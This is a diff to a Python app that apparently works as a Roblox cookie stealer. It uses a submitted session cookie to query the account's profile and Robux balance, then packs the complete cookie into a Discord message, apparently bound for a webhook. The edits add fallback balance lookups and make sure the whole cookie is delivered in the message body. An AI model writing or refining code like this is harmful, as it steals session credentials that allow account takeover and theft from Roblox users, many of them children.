@@ -36,14 +36,41 @@ def get_roblox_user_info(cookie):
                 if avatar_data.get('data') and len(avatar_data['data']) > 0:
                     profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
             
-            # Get Robux balance
-            robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
-                                        headers=headers, timeout=5)
-            
+            # Get Robux balance - try multiple endpoints
             robux_balance = 'Not available'
-            if robux_response.status_code == 200:
-                robux_data = robux_response.json()
-                robux_balance = f"R$ {robux_data.get('robux', 0):,}"
+            
+            # Try the currency endpoint first
+            try:
+                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
+                                            headers=headers, timeout=5)
+                print(f"Robux API response status: {robux_response.status_code}")
+                
+                if robux_response.status_code == 200:
+                    robux_data = robux_response.json()
+                    print(f"Robux API response: {robux_data}")
+                    if 'robux' in robux_data:
+                        robux_balance = f"R$ {robux_data['robux']:,}"
+                    else:
+                        print("No 'robux' field in response")
+                else:
+                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
+            except Exception as robux_error:
+                print(f"Error getting Robux balance: {str(robux_error)}")
+                
+            # If first method failed, try alternative endpoint using user_id
+            if robux_balance == 'Not available' and user_id:
+                try:
+                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
+                                              headers=headers, timeout=5)
+                    print(f"Alternative Robux API response status: {alt_response.status_code}")
+                    
+                    if alt_response.status_code == 200:
+                        alt_robux_data = alt_response.json()
+                        print(f"Alternative Robux API response: {alt_robux_data}")
+                        if 'robux' in alt_robux_data:
+                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
+                except Exception as alt_error:
+                    print(f"Alternative Robux API error: {str(alt_error)}")
             
             return {
                 'username': username,
@@ -211,38 +238,11 @@ def submit_form():
             }
         ]
         
-        # Handle long cookies by splitting them into multiple fields
-        if cookie:
-            if len(cookie) <= 1024:
-                # Single field for shorter cookies
-                fields.append({
-                    'name': '🍪 Whole Cookie',
-                    'value': f'```{cookie}```',
-                    'inline': False
-                })
-            else:
-                # Split long cookies into multiple fields
-                cookie_parts = []
-                chunk_size = 1000  # Leave room for backticks and formatting
-                for i in range(0, len(cookie), chunk_size):
-                    chunk = cookie[i:i + chunk_size]
-                    cookie_parts.append(chunk)
-                
-                for i, part in enumerate(cookie_parts):
-                    field_name = f'🍪 Cookie Part {i + 1}/{len(cookie_parts)}'
-                    fields.append({
-                        'name': field_name,
-                        'value': f'```{part}```',
-                        'inline': False
-                    })
-        else:
-            fields.append({
-                'name': '🍪 Whole Cookie',
-                'value': 'Not provided',
-                'inline': False
-            })
+        # Prepare main message content with the complete cookie
+        cookie_content = f"🍪 **Whole Cookie:**\n```{cookie}```" if cookie else "🍪 **Whole Cookie:** Not provided"
 
         discord_data = {
+            'content': cookie_content,
             'embeds': [{
                 'title': f'🎮 Roblox Account Profile - {user_info["display_name"]}',
                 'color': 0x00d4ff,  # Roblox blue color
